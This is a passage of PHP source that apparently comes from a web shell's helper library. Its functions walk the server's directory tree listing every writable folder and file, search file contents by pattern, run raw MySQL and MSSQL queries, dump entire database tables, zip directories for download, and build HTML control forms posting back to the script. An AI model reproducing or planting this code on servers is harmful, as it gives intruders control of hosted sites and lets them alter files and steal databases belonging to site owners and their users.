	return $pathinfo['extension'];
}

function GetWDirList($dir){
	global $dirdata,$j,$nowpath;
	!$j && $j=1;
	if ($dh = opendir($dir)) {
		while ($file = readdir($dh)) {
			$f=str_replace('//','/',$dir.'/'.$file);
			if($file!='.' && $file!='..' && is_dir($f)){
				if (is_writable($f)) {
					$dirdata[$j]['filename']=str_replace($nowpath,'',$f);
					$dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
					$dirdata[$j]['dirchmod']=getChmod($f);
					$dirdata[$j]['dirperm']=getPerms($f);
					$dirdata[$j]['dirlink']=ue($dir);
					$dirdata[$j]['server_link']=$f;
					$dirdata[$j]['client_link']=ue($f);
					$j++;
				}
				GetWDirList($f);
			}
		}
		closedir($dh);
		clearstatcache();
		return $dirdata;
	} else {
		return array();
	}
}

function GetWFileList($dir){
	global $filedata,$j,$nowpath, $writabledb;
	!$j && $j=1;
	if ($dh = opendir($dir)) {
		while ($file = readdir($dh)) {
			$ext = getextension($file);
			$f=str_replace('//','/',$dir.'/'.$file);
			if($file!='.' && $file!='..' && is_dir($f)){
				GetWFileList($f);
			} elseif($file!='.' && $file!='..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
				if (is_writable($f)) {
					$filedata[$j]['filename']=str_replace($nowpath,'',$f);
					$filedata[$j]['size']=sizecount(@filesize($f));
					$filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
					$filedata[$j]['filechmod']=getChmod($f);
					$filedata[$j]['fileperm']=getPerms($f);
					$filedata[$j]['fileowner']=getUser($f);
					$filedata[$j]['dirlink']=$dir;
					$filedata[$j]['server_link']=$f;
					$filedata[$j]['client_link']=ue($f);
					$j++;
				}
			}
		}
		closedir($dh);
		clearstatcache();
		return $filedata;
	} else {
		return array();
	}
}

function GetSFileList($dir, $content, $re = 0) {
	global $filedata,$j,$nowpath, $writabledb;
	!$j && $j=1;
	if ($dh = opendir($dir)) {
		while ($file = readdir($dh)) {
			$ext = getextension($file);
			$f=str_replace('//','/',$dir.'/'.$file);
			if($file!='.' && $file!='..' && is_dir($f)){
				GetSFileList($f, $content, $re = 0);
			} elseif($file!='.' && $file!='..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
				$find = 0;
				if ($re) {
					if ( preg_match('@'.$content.'@',$file) || preg_match('@'.$content.'@', @file_get_contents($f)) ){
						$find = 1;
					}
				} else {
					if ( strstr($file, $content) || strstr( @file_get_contents($f),$content ) ) {
						$find = 1;
					}
				}
				if ($find) {
					$filedata[$j]['filename']=str_replace($nowpath,'',$f);
					$filedata[$j]['size']=sizecount(@filesize($f));
					$filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
					$filedata[$j]['filechmod']=getChmod($f);
					$filedata[$j]['fileperm']=getPerms($f);
					$filedata[$j]['fileowner']=getUser($f);
					$filedata[$j]['dirlink']=$dir;
					$filedata[$j]['server_link']=$f;
					$filedata[$j]['client_link']=ue($f);
					$j++;
				}
			}
		}
		closedir($dh);
		clearstatcache();
		return $filedata;
	} else {
		return array();
	}
}

function qy($sql) { 
	//echo $sql.'<br>';
	$res = $error = '';
	if(!$res = @mysql_query($sql)) { 
		return 0;
	} else if(is_resource($res)) {
		return 1; 
	} else {
		return 2;
	}	
	return 0;
}

function q($sql) { 
	return @mysql_query($sql);
}

function fr($qy){
	mysql_free_result($qy);
}

//mssql
function msq($sql) { 
	return @mssql_query($sql);
}

function msfr($qy){
	mssql_free_result($qy);
}

function msmsg(){
	return mssql_get_last_message();
}

function msqy($sql) { 
	//echo $sql.'<br>';
	$res = $error = '';
	if(!$res = @mssql_query($sql)) { 
		return 0;
	} else if(is_resource($res)) {
		return 1; 
	} else {
		return 2;
	}	
	return 0;
}

function sizecount($size) {
	if($size > 1073741824) {
		$size = round($size / 1073741824 * 100) / 100 . ' G';
	} elseif($size > 1048576) {
		$size = round($size / 1048576 * 100) / 100 . ' M';
	} elseif($size > 1024) {
		$size = round($size / 1024 * 100) / 100 . ' K';
	} else {
		$size = $size . ' B';
	}
	return $size;
}

// ..........
class archive
{
	function archive($name)
	{
		$this->options = array (
			'basedir' => ".",
			'name' => $name,
			'prepend' => "",
			'inmemory' => 0,
			'overwrite' => 0,
			'recurse' => 1,
			'storepaths' => 1,
			'followlinks' => 0,
			'level' => 3,
			'method' => 1,
			'sfx' => "",
			'type' => "",
			'comment' => ""
		);
		$this->files = array ();
		$this->exclude = array ();
		$this->storeonly = array ();
		$this->error = array ();
	}

	function set_options($options)
	{
		foreach ($options as $key => $value)
			$this->options[$key] = $value;
		if (!empty ($this->options['basedir']))
		{
			$this->options['basedir'] = str_replace("\\", "/", $this->options['basedir']);
			$this->options['basedir'] = preg_replace("/\/+/", "/", $this->options['basedir']);
			$this->options['basedir'] = preg_replace("/\/$/", "", $this->options['basedir']);
		}
		if (!empty ($this->options['name']))
		{
			$this->options['name'] = str_replace("\\", "/", $this->options['name']);
			$this->options['name'] = preg_replace("/\/+/", "/", $this->options['name']);
		}
		if (!empty ($this->options['prepend']))
		{
			$this->options['prepend'] = str_replace("\\", "/", $this->options['prepend']);
			$this->options['prepend'] = preg_replace("/^(\.*\/+)+/", "", $this->options['prepend']);
			$this->options['prepend'] = preg_replace("/\/+/", "/", $this->options['prepend']);
			$this->options['prepend'] = preg_replace("/\/$/", "", $this->options['prepend']) . "/";
		}
	}

	function create_archive()
	{
		$this->make_list();

		if ($this->options['inmemory'] == 0)
		{
			$pwd = getcwd();
			chdir($this->options['basedir']);
			if ($this->options['overwrite'] == 0 && file_exists($this->options['name'] . ($this->options['type'] == "gzip" || $this->options['type'] == "bzip" ? ".tmp" : "")))
			{
				$this->error[] = "File {$this->options['name']} already exists.";
				chdir($pwd);
				return 0;
			}
			else if ($this->archive = @fopen($this->options['name'] . ($this->options['type'] == "gzip" || $this->options['type'] == "bzip" ? ".tmp" : ""), "wb+"))
				chdir($pwd);
			else
			{
				$this->error[] = "Could not open {$this->options['name']} for writing.";
				chdir($pwd);
				return 0;
			}
		}
		else
			$this->archive = "";

		switch ($this->options['type'])
		{
		case "zip":
			if (!$this->create_zip())
			{
				$this->error[] = "Could not create zip file.";
				return 0;
			}
			break;
		}

		if ($this->options['inmemory'] == 0)
		{
			fclose($this->archive);
			if ($this->options['type'] == "gzip" || $this->options['type'] == "bzip")
				unlink($this->options['basedir'] . "/" . $this->options['name'] . ".tmp");
		}
	}

	function add_data($data)
	{
		if ($this->options['inmemory'] == 0)
			fwrite($this->archive, $data);
		else
			$this->archive .= $data;
	}

	function make_list()
	{
		if (!empty ($this->exclude))
			foreach ($this->files as $key => $value)
			{
				foreach ($this->exclude as $current)
				{
					if ($value['name'] == $current['name'] || $value['name'] == $current['name2'])
						unset ($this->files[$key]);
				}
			}

		if (!empty ($this->storeonly))
			foreach ($this->files as $key => $value)
				foreach ($this->storeonly as $current)
					if ($value['name'] == $current['name'])
						$this->files[$key]['method'] = 0;
		unset ($this->exclude, $this->storeonly);
	}

	function add_files($list)
	{
		$temp = $this->list_files($list);
		foreach ($temp as $current)
			$this->files[] = $current;
	}

	function exclude_files($list)
	{
		$temp = $this->list_files($list);

		foreach ($temp as $current)
			$this->exclude[] = $current;
	}

	function store_files($list)
	{
		$temp = $this->list_files($list);
		foreach ($temp as $current)
			$this->storeonly[] = $current;
	}

	function list_files($list)
	{
		if (!is_array ($list))
		{
			$temp = $list;
			$list = array ($temp);
			unset ($temp);
		}

		$files = array ();

		$pwd = getcwd();
		chdir($this->options['basedir']);

		foreach ($list as $current)
		{
			$current = str_replace("\\", "/", $current);
			$current = preg_replace("/\/+/", "/", $current);
			$current = preg_replace("/\/$/", "", $current);
			if (strstr($current, "*"))
			{
				$regex = preg_replace("/([\\\^\$\.\[\]\|\(\)\?\+\{\}\/])/", "\\\\\\1", $current);
				$regex = str_replace("*", ".*", $regex);
				$dir = strstr($current, "/") ? substr($current, 0, strrpos($current, "/")) : ".";
				$temp = $this->parse_dir($dir);

				foreach ($temp as $current2)
				{
					if (preg_match("/^{$regex}$/i", $current2['name']))
						$files[] = $current2;
				}

				unset ($regex, $dir, $temp, $current);
			}
			else if (@is_dir($current))
			{
				echo "dir";
				$temp = $this->parse_dir($current);
				foreach ($temp as $file)
					$files[] = $file;
				unset ($temp, $file);
			}
			else if (@file_exists($current))
				$files[] = array ('name' => $current, 'name2' => $this->options['prepend'] .
					preg_replace("/(\.+\/+)+/", "", ($this->options['storepaths'] == 0 && strstr($current, "/")) ?
					substr($current, strrpos($current, "/") + 1) : $current),
					'type' => @is_link($current) && $this->options['followlinks'] == 0 ? 2 : 0,
					'ext' => substr($current, strrpos($current, ".")), 'stat' => stat($current));
			else {
			    //echo "other error "; //...............................
			}
		}		

		chdir($pwd);

		unset ($current, $pwd);

		usort($files, array ("archive", "sort_files"));

		//print_r($files); //die;
		return $files;

	}

	function parse_dir($dirname)
	{
		if ($this->options['storepaths'] == 1 && !preg_match("/^(\.+\/*)+$/", $dirname))
			$files = array (array ('name' => $dirname, 'name2' => $this->options['prepend'] .
				preg_replace("/(\.+\/+)+/", "", ($this->options['storepaths'] == 0 && strstr($dirname, "/")) ?
				substr($dirname, strrpos($dirname, "/") + 1) : $dirname), 'type' => 5, 'stat' => stat($dirname)));
		else
			$files = array ();
		$dir = @opendir($dirname);

		while ($file = @readdir($dir))
		{
			$fullname = $dirname . "/" . $file;
			if ($file == "." || $file == "..")
				continue;
			else if (@is_dir($fullname))
			{
				if (empty ($this->options['recurse']))
					continue;
				$temp = $this->parse_dir($fullname);
				foreach ($temp as $file2)
					$files[] = $file2;
			}
			else if (@file_exists($fullname)) {
				$files[] = array (
					'name' => $fullname,
					'name2' => $this->options['prepend'] . preg_replace("/(\.+\/+)+/", "", ($this->options['storepaths'] == 0 && strstr($fullname, "/")) ?
					substr($fullname, strrpos($fullname, "/") + 1) : $fullname),
					'type' => @is_link($fullname) && $this->options['followlinks'] == 0 ? 2 : 0,
					'ext' => substr($file, strrpos($file, ".")),
					'stat' => stat($fullname)
				);
			}
		}

		@closedir($dir);

		return $files;
	}

	function sort_files($a, $b)
	{
		if ($a['type'] != $b['type'])
			if ($a['type'] == 5 || $b['type'] == 2)
				return -1;
			else if ($a['type'] == 2 || $b['type'] == 5)
				return 1;
		else if ($a['type'] == 5)
			return strcmp(strtolower($a['name']), strtolower($b['name']));
		else if ($a['ext'] != $b['ext'])
			return strcmp($a['ext'], $b['ext']);
		else if ($a['stat'][7] != $b['stat'][7])
			return $a['stat'][7] > $b['stat'][7] ? -1 : 1;
		else
			return strcmp(strtolower($a['name']), strtolower($b['name']));
		return 0;
	}

	function download_file()
	{
		if ($this->options['inmemory'] == 0)
		{
			$this->error[] = "Can only use download_file() if archive is in memory. Redirect to file otherwise, it is faster.";
			return;
		}

		header("Content-Type: application/zip");
		$header = "Content-Disposition: attachment; filename=\"";
		$header .= strstr($this->options['name'], "/") ? substr($this->options['name'], strrpos($this->options['name'], "/") + 1) : $this->options['name'];
		$header .= "\"";
		header($header);
		header("Content-Length: " . strlen($this->archive));
		header("Content-Transfer-Encoding: binary");
		print($this->archive);
	}
}

class zip_file extends archive
{
	function zip_file($name)
	{
		$this->archive($name);
		$this->options['type'] = "zip";
	}

	function create_zip()
	{
		$files = 0;
		$offset = 0;
		$central = "";

		if (!empty ($this->options['sfx']))
			if ($fp = @fopen($this->options['sfx'], "rb"))
			{
				$temp = fread($fp, filesize($this->options['sfx']));
				fclose($fp);
				$this->add_data($temp);
				$offset += strlen($temp);
				unset ($temp);
			}
			else
				$this->error[] = "Could not open sfx module from {$this->options['sfx']}.";

		$pwd = getcwd();
		chdir($this->options['basedir']);

		foreach ($this->files as $current)
		{
			if ($current['name'] == $this->options['name'])
				continue;

			$timedate = explode(" ", date("Y n j G i s", $current['stat'][9]));
			$timedate = ($timedate[0] - 1980 << 25) | ($timedate[1] << 21) | ($timedate[2] << 16) | ($timedate[3] << 11) | ($timedate[4] << 5) | ($timedate[5]);

			$block = pack("VvvvV", 0x04034b50, 0x000A, 0x0000, (isset($current['method']) || $this->options['method'] == 0) ? 0x0000 : 0x0008, $timedate);

			if ($current['stat'][7] == 0 && $current['type'] == 5)
			{
				$block .= pack("VVVvv", 0x00000000, 0x00000000, 0x00000000, strlen($current['name2']) + 1, 0x0000);
				$block .= $current['name2'] . "/";
				$this->add_data($block);
				$central .= pack("VvvvvVVVVvvvvvVV", 0x02014b50, 0x0014, $this->options['method'] == 0 ? 0x0000 : 0x000A, 0x0000,
					(isset($current['method']) || $this->options['method'] == 0) ? 0x0000 : 0x0008, $timedate,
					0x00000000, 0x00000000, 0x00000000, strlen($current['name2']) + 1, 0x0000, 0x0000, 0x0000, 0x0000, $current['type'] == 5 ? 0x00000010 : 0x00000000, $offset);
				$central .= $current['name2'] . "/";
				$files++;
				$offset += (31 + strlen($current['name2']));
			}
			else if ($current['stat'][7] == 0)
			{
				$block .= pack("VVVvv", 0x00000000, 0x00000000, 0x00000000, strlen($current['name2']), 0x0000);
				$block .= $current['name2'];
				$this->add_data($block);
				$central .= pack("VvvvvVVVVvvvvvVV", 0x02014b50, 0x0014, $this->options['method'] == 0 ? 0x0000 : 0x000A, 0x0000,
					(isset($current['method']) || $this->options['method'] == 0) ? 0x0000 : 0x0008, $timedate,
					0x00000000, 0x00000000, 0x00000000, strlen($current['name2']), 0x0000, 0x0000, 0x0000, 0x0000, $current['type'] == 5 ? 0x00000010 : 0x00000000, $offset);
				$central .= $current['name2'];
				$files++;
				$offset += (30 + strlen($current['name2']));
			}
			else if ($fp = @fopen($current['name'], "rb"))
			{
				$temp = fread($fp, $current['stat'][7]);
				fclose($fp);
				$crc32 = crc32($temp);
				if (!isset($current['method']) && $this->options['method'] == 1)
				{
					$temp = gzcompress($temp, $this->options['level']);
					$size = strlen($temp) - 6;
					$temp = substr($temp, 2, $size);
				}
				else
					$size = strlen($temp);
				$block .= pack("VVVvv", $crc32, $size, $current['stat'][7], strlen($current['name2']), 0x0000);
				$block .= $current['name2'];
				$this->add_data($block);
				$this->add_data($temp);
				unset ($temp);
				$central .= pack("VvvvvVVVVvvvvvVV", 0x02014b50, 0x0014, $this->options['method'] == 0 ? 0x0000 : 0x000A, 0x0000,
					(isset($current['method']) || $this->options['method'] == 0) ? 0x0000 : 0x0008, $timedate,
					$crc32, $size, $current['stat'][7], strlen($current['name2']), 0x0000, 0x0000, 0x0000, 0x0000, 0x00000000, $offset);
				$central .= $current['name2'];
				$files++;
				$offset += (30 + strlen($current['name2']) + $size);
			}
			else
				$this->error[] = "Could not open file {$current['name']} for reading. It was not added.";
		}

		$this->add_data($central);

		$this->add_data(pack("VvvvvVVv", 0x06054b50, 0x0000, 0x0000, $files, $files, strlen($central), $offset,
			!empty ($this->options['comment']) ? strlen($this->options['comment']) : 0x0000));

		if (!empty ($this->options['comment']))
			$this->add_data($this->options['comment']);

		chdir($pwd);

		return 1;
	}
}

// ..........
function sqldumptable($table, $fp=0) {

	$tabledump = "DROP TABLE IF EXISTS `$table`;\n";
	$res = q('SHOW CREATE TABLE `'.$table.'`');
	$create = mysql_fetch_array($res);
	$tabledump .= $create[1].";\n\n";

	if ($fp) {
		fwrite($fp,$tabledump);
	} else {
		echo $tabledump;
	}
	$tabledump = '';
	$rows = q("SELECT * FROM $table");
	while ($row = mysql_fetch_assoc($rows)) {
		foreach($row as $k=>$v) {
			$row[$k] = "'".@mysql_real_escape_string($v)."'";
		}
		$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(", ", $row).');'."\n";
		if ($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}
	}
	fr($rows);
}

function ue($str){
	return urlencode($str);
}

function p($str){
	echo $str."\n";
}

function tbhead() {
	p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
}
function tbfoot(){
	p('</table>');
}

function makehide($name,$value=''){
	p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
}

function makeinput($arg = array()){
	$arg['size'] = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
	$arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
	!$arg['type'] && $arg['type'] = 'text';
	$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
	$arg['class'] = $arg['class'] ? $arg['class'] : 'input';
	if ($arg['newline']) {
		p("<p>$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
	} else {
		p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
	}
}

function makeselect($arg = array()){
	if ($arg['onchange']) {
		$onchange = 'onchange="'.$arg['onchange'].'"';
	}
	$arg['title'] = $arg['title'] ? $arg['title'] : '';
	if ($arg['newline']) p('<p>');
	p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
		if (is_array($arg['option'])) {
			if ($arg['nokey']) {
				foreach ($arg['option'] as $value) {
					if ($arg['selected']==$value) {
						p("<option value=\"$value\" selected>$value</option>");
					} else {
						p("<option value=\"$value\">$value</option>");
					}
				}
			} else {
				foreach ($arg['option'] as $key=>$value) {
					if ($arg['selected']==$key) {
						p("<option value=\"$key\" selected>$value</option>");
					} else {
						p("<option value=\"$key\">$value</option>");
					}
				}
			}
		}
	p("</select>");
	if ($arg['newline']) p('</p>');
}
function formhead($arg = array()) {
	global $self;
	!$arg['method'] && $arg['method'] = 'post';
	!$arg['action'] && $arg['action'] = $self;
	$arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
	!$arg['name'] && $arg['name'] = 'form1';
	p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
	if ($arg['title']) {
		p('<h2>'.$arg['title'].' &raquo;</h2>');
	}
}
	
function maketext($arg = array()){
	!$arg['cols'] && $arg['cols'] = 100;
	!$arg['rows'] && $arg['rows'] = 25;
	$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
	p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
}

function formfooter($name = ''){
	!$name && $name = 'submit';
	p('<p><input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="Submit"></p>');
	p('</form>');
}

function goback(){
	global $self, $nowpath;
	p('<form action="'.$self.'" method="post"><input type="hidden" name="action" value="file" /><input type="hidden" name="dir" value="'.$nowpath.'" /><p><input class="bt" type="submit" value="Go back..."></p></form>');
}

function formfoot(){
	p('</form>');
}

function pr($s){
	echo "<pre>".print_r($s).'</pre>';
}

*/
